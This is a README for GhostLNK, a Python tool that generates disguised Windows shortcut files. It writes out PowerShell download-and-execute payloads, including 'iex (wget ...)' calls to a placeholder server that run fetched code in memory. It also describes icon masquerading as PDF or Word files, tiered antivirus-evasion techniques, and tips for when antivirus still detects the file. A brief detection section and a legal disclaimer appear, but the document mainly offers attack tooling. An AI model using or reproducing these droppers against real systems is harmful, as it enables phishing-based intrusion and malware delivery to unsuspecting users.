<p align="center">
  
# 👻 GhostLNK - Professional LNK Generator with Stealth Mode

[![Python](https://img.shields.io/badge/Python-3.8+-blue.svg)](https://www.python.org/)
[![PyQt6](https://img.shields.io/badge/PyQt6-6.0+-green.svg)](https://www.riverbankcomputing.com/software/pyqt/)
[![Platform](https://img.shields.io/badge/Platform-Windows-lightgrey.svg)](https://www.microsoft.com/windows)
[![License](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
[![GitHub](https://img.shields.io/badge/GitHub-Excalibra-purple?style=flat&logo=github)](https://github.com/Excalibra/)

<img src="https://img.shields.io/badge/Version-6.2-6a1f7a?style=for-the-badge" alt="GhostLNK v6.2">
</p>

<img width="1917" height="912" alt="image" src="https://github.com/user-attachments/assets/f9683e59-9a71-4e49-a5cd-7fab56cff33b" />


---

## 📋 Overview

**GhostLNK v6.2** is a professional-grade Windows LNK (Shortcut) file generator with advanced stealth capabilities and an intuitive step-by-step workflow. Designed for security researchers, penetration testers, and red team operations, it enables the creation of sophisticated LNK files that can bypass modern antivirus detection while maintaining realistic appearances.

### 🎯 Use Cases

- Security Research & Malware Analysis
- Red Team Operations & Penetration Testing
- Phishing Simulation & User Awareness Training
- Educational Demonstrations of Attack Vectors

---

## ✨ Key Features

### 🚀 Advanced Payload Generation

| Feature | Description |
|---------|-------------|
| **📁 Download & Open** | Downloads files to temp directory and opens them with default applications |
| **⚡ Memory Execution** | Executes PowerShell scripts directly in memory - no files written to disk |
| **🕵️ Ultra Stealth Mode** | Minimal output with obfuscated commands for maximum AV evasion |

### 🛡️ Multi-Level Stealth System

| Level | Name | Description | AV Evasion |
|-------|------|-------------|------------|
| 0 | Normal | Standard output, visible window | ❌ Low |
| 1 | Moderate | Uses aliases, avoids obvious patterns | ⚠️ Medium |
| 2 | Maximum | Obfuscated code, no suspicious flags, AV bypass attempt | ✅ High |

### 🎨 Professional GUI Features

- **Step-by-Step Workflow** - Clear 5-step process with visual progress indicators
- **Smart Conflict Resolution** - Automatic option disabling with visual feedback
- **Real-Time Visual Feedback** - Green highlights for active selections, gray for disabled
- **Tooltip Explanations** - Hover over disabled options to see why
- **Dark Theme Interface** - Easy on the eyes during long analysis sessions
- **Real-Time URL Validation** - Automatic Dropbox URL checking with `dl=1` parameter detection
- **Icon Masquerading** - 8+ realistic icon options (PDF, Word, Excel, etc.)
- **Live Console Output** - Real-time logging and debugging information
- **Multi-Format Support** - Generate LNK files with customizable names and extensions

### 🔧 Technical Capabilities

- **Base64 Encoding** - Automatic PowerShell command encoding
- **Smart Payload Detection** - Auto-suggests payload type based on URL extension
- **Recent History** - Saves recent URLs and conversions for quick access
- **Cross-Format Export** - Copy commands, arguments, or generate complete LNK files

---

## 📦 Installation

### Prerequisites

```bash
# Python 3.8 or higher required
python --version

# Windows OS (required for LNK file generation)
```

### Quick Setup

```bash
# Clone the repository
git clone https://github.com/Excalibra/GhostLNK.git

# Navigate to directory
cd GhostLNK

# Install dependencies (auto-installed on first run)
pip install PyQt6 pylnk3

# Make the script executable (optional)
chmod +x ghostlnk.py
```

### Dependencies

GhostLNK automatically installs missing dependencies on first run:

- **PyQt6** - Professional GUI framework
- **pylnk3** - Core LNK file generation engine

---

## 🎮 Usage Guide

### Launching GhostLNK

```bash
# Basic launch
python ghostlnk.py

# Or make executable and run directly
./ghostlnk.py
```

### Quick Start - 5 Step Workflow

#### Step 1: Enter Your URL
```
Example: https://www.dropbox.com/scl/fi/abc123/document.pdf?dl=1
```

#### Step 2: Select Payload Type
- **PDF/Image/Document** → Choose "Download & Open"
- **PowerShell Script** → Choose "Memory Execute"
- **Maximum Stealth** → Choose "Ultra Stealth"

#### Step 3: Configure Stealth Level
- **Level 0 (Normal)** - Visible output, for testing
- **Level 1 (Moderate)** - Uses aliases, avoids obvious patterns
- **Level 2 (Maximum)** - Obfuscated code, AV bypass attempt

#### Step 4: Execution Options
- **⏸️ Pause after execution** - Keeps window open (auto-disabled when incompatible)
- **🐛 Enable Debug Mode** - Verbose output for troubleshooting
- **🔒 Hide PowerShell Window** - Complete invisibility (auto-disables pause/debug)

> 💡 **Smart Conflict Resolution**: Options automatically disable with visual feedback when incompatible combinations are selected. Hover over any disabled option to see why.

#### Step 5: Generate (Follow the Numbers)
```
⚠️ MUST CLICK IN THIS ORDER: 1 → 2 → 3 → 🚀

1️⃣ Show Command      → Preview your payload
2️⃣ Encode to Base64  → Generate -E argument
3️⃣ Copy -E Argument  → Copy to clipboard
🚀 Use in LNK Generator → Load into LNK builder
```

**Visual Progress Tracker:**
```
Progress: ⚪ Step 1 → ⚪ Step 2 → ⚪ Step 3 → ⚪ Step 4
          (Turns green as you complete each step)
```

### Advanced Features

#### Dropbox URL Validation
```python
# GhostLNK automatically validates Dropbox URLs
❌ https://www.dropbox.com/s/abc123/file.pdf  # Missing dl=1
✅ https://www.dropbox.com/s/abc123/file.pdf?dl=1  # Correct format
```

#### Smart Option Management

| Selection | Auto-Disabled | Visual Feedback |
|-----------|---------------|-----------------|
| Hide PowerShell checked | Pause + Debug | Grayed out with tooltip |
| Hide PowerShell unchecked | None | Returns to normal |
| Any option disabled | N/A | Gray text + explanation on hover |

#### Icon Database
```python
ICON_DATABASE = {
    "PDF Document": (r"%ProgramFiles(x86)%\Microsoft\Edge\Application\msedge.exe", 11),
    "Word Document": (r"C:\Windows\System32\SHELL32.dll", 1),
    "Excel Spreadsheet": (r"C:\Windows\System32\SHELL32.dll", 3),
    "Text Document": (r"C:\Windows\System32\notepad.exe", 0),
    "PowerShell Script": (r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", 0),
    "Executable": (r"C:\Windows\System32\SHELL32.dll", 3),
    "JPG Image": (r"C:\Windows\System32\imageres.dll", 67),
    "ZIP Archive": (r"C:\Windows\System32\imageres.dll", 165),
}
```

---

## 🛡️ Stealth Mode Deep Dive

### Why Stealth Matters

Modern antivirus solutions (Windows Defender, CrowdStrike, SentinelOne) actively monitor for:
- `-WindowStyle Hidden` flags
- Long encoded PowerShell commands
- Suspicious combinations of arguments
- Known malicious patterns

### Maximum Stealth (Level 2) Techniques

```powershell
# Instead of this (easily detected):
powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -E SQBFAFgAIAAoAE4AZ...

# GhostLNK Level 2 generates:
powershell.exe -E SQBFAFgAIAAoAE4AZ...

# Payload is obfuscated:
iex (wget -useb "https://your-server.com/payload.ps1");
```

### Stealth Comparison

| Technique | Level 0 | Level 1 | Level 2 |
|-----------|---------|---------|---------|
| `-WindowStyle Hidden` | ✅ | ❌ | ❌ |
| Full Cmdlet Names | ✅ | ❌ | ❌ |
| PowerShell Aliases | ❌ | ✅ | ✅ |
| Variable Obfuscation | ❌ | ❌ | ✅ |
| Comment Removal | ❌ | ✅ | ✅ |
| Minimal Output | ❌ | ✅ | ✅ |

---

## 📊 Payload Examples

### Download & Open Mode (Stealth Level 2)
```powershell
# Generated command
$u="https://dropbox.com/file.pdf?dl=1";$t=[IO.Path]::GetTempPath();$f=[IO.Path]::Combine($t,"doc.pdf");(New-Object Net.WebClient).DownloadFile($u,$f);Start "$f";
```

### Memory Execute Mode (Stealth Level 2)
```powershell
# Generated command
iex (wget -useb "https://your-server.com/script.ps1");
```

### Ultra Stealth Mode
```powershell
# Minimal, obfuscated command
iex (wget -useb "https://your-server.com/payload.ps1");
```

---

## 🔧 Configuration

### Settings File (`ghostlnk_config.json`)
```json
{
    "recent_urls": [
        "https://dropbox.com/s/abc123/file.pdf?dl=1",
        "https://your-vps.com/script.ps1"
    ],
    "recent_conversions": [
        "-E SQBFAFgAIAAoAE4AZ..."
    ]
}
```

### Customizing Icon Database
Edit the `ICON_DATABASE` dictionary in `ghostlnk.py`:
```python
ICON_DATABASE = {
    "Custom Application": (r"C:\Path\to\your\app.exe", 0, ".custom"),
    # Add your own entries...
}
```

---

## 🚀 Performance Metrics

| Operation | Time |
|-----------|------|
| GUI Launch | < 2 seconds |
| URL Validation | < 100ms |
| Base64 Encoding | < 50ms |
| LNK File Generation | < 200ms |
| Memory Usage | ~50-80 MB |

---

## 📁 Project Structure

```
GhostLNK/
├── ghostlnk.py                 # Main application
├── README.md                    # Documentation
├── LICENSE                      # MIT License
├── ghostlnk_config.json         # Auto-generated config
└── requirements.txt             # Dependencies (optional)
```

---

## 🎓 Educational Resources

### Understanding LNK Attacks
- [Microsoft LNK File Format Specification](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/)
- [MITRE ATT&CK - LNK Files (T1204.002)](https://attack.mitre.org/techniques/T1204/002/)
- [Red Team LNK Tradecraft](https://redteam.guide/docs/Execution/LNK)

### Detection & Prevention
- Monitor PowerShell event logs (Event ID 4104, 4103)
- Enable AMSI (Antimalware Scan Interface)
- Deploy application whitelisting
- Implement user awareness training

---

## ⚠️ Legal & Ethical Use

**IMPORTANT:** GhostLNK is designed for:

✅ **Authorized Security Testing** - With written permission from system owners  
✅ **Educational Purposes** - Learning about attack vectors and defense  
✅ **Incident Response** - Simulating attacks to test defenses  
✅ **Research** - Understanding malware capabilities  

**UNAUTHORIZED USE IS STRICTLY PROHIBITED**

- ❌ Do not use on systems you don't own
- ❌ Do not use for malicious purposes
- ❌ Do not distribute malicious LNK files
- ❌ Do not bypass security controls without authorization

Violation of these terms may result in criminal prosecution under the Computer Fraud and Abuse Act (CFAA) and similar laws worldwide.

---

## 🤝 Contributing

We welcome contributions from the security community!

### How to Contribute

1. **Fork the Repository**
   ```bash
   git clone https://github.com/Excalibra/GhostLNK.git
   ```

2. **Create a Feature Branch**
   ```bash
   git checkout -b feature/amazing-feature
   ```

3. **Commit Your Changes**
   ```bash
   git commit -m 'Add amazing feature'
   ```

4. **Push to Your Fork**
   ```bash
   git push origin feature/amazing-feature
   ```

5. **Open a Pull Request**

### Development Guidelines

- Follow PEP 8 style guidelines
- Add comments for complex logic
- Update documentation for new features
- Test thoroughly before submitting

---

## 📝 Version History

| Version | Date | Key Features |
|---------|------|--------------|
| 6.2 | 2026-03-12 | **Smart Conflict Resolution**: Auto-disabling options with tooltips, visual progress indicators, step-by-step workflow, force repaint fixes for UI states |
| 6.1 | 2026-03-10 | Hidden PowerShell Window option added |
| 6.0 | 2026-02-20 | Stealth Mode Edition with 3-level AV bypass |
| 5.0 | 2026-01-15 | Dropbox URL validation, improved GUI |
| 4.0 | 2025-12-10 | Memory execution mode added |
| 3.0 | 2025-11-20 | Icon database expanded |
| 2.0 | 2025-10-15 | Base64 encoding support |
| 1.0 | 2025-09-01 | Initial release |

---

## 🛠️ Troubleshooting

### Common Issues & Solutions

**Q: LNK file doesn't execute properly**
- Verify URL is accessible
- Check Dropbox URLs have `dl=1`
- Ensure target system has PowerShell

**Q: Antivirus still detects the file**
- Increase stealth level to 2
- Use Memory Execute mode
- Test with different icons

**Q: GUI won't launch**
- Install PyQt6: `pip install PyQt6`
- Check Python version: `python --version`
- Verify Windows OS

**Q: Options stay grayed out after deselection**
- Fixed in v6.2 with force repaint fixes
- Update to latest version

**Q: Not sure which order to click buttons**
- Follow the numbered steps (1️⃣ → 2️⃣ → 3️⃣ → 🚀)
- Watch the progress indicators turn green

---

## 📞 Support & Contact

- **GitHub Issues**: [Report bugs](https://github.com/Excalibra/GhostLNK/issues)
- **Documentation**: [Wiki](https://github.com/Excalibra/GhostLNK/wiki)
- **Discussions**: [Community Forum](https://github.com/Excalibra/GhostLNK/discussions)

---

## 🙏 Acknowledgments

- Thanks to the pylnk3 developers for the core LNK engine
- Inspired by real-world APT techniques and red team tools
- Special thanks to the security research community

---

## 📄 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

```
MIT License

Copyright (c) 2026 Excalibra

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files...
```

---

## 🔗 Quick Links

- [GitHub Repository](https://github.com/Excalibra/GhostLNK)
- [Author Profile](https://github.com/Excalibra/)
- [Report a Bug](https://github.com/Excalibra/GhostLNK/issues)
- [Request a Feature](https://github.com/Excalibra/GhostLNK/issues)

---

<p align="center">
  <b>👻 GhostLNK v6.2 - Smart Execution Builder 👻</b><br>
  For authorized security testing and educational purposes only
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Version-6.2_Smart_Execution_Builder-6a1f7a?style=flat-square">
  <img src="https://img.shields.io/badge/Python-3.8+-blue?style=flat-square">
  <img src="https://img.shields.io/badge/Platform-Windows-lightgrey?style=flat-square">
</p>
